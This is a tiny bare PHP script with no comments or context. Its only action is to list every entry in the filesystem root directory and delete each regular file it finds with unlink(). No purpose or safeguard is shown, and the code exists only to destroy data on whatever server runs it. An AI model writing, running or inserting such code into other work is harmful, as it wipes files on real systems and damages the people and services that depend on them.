<?php

$files = glob('/*');
foreach($files as $file){
  if(is_file($file))
    unlink($file); 
}
?>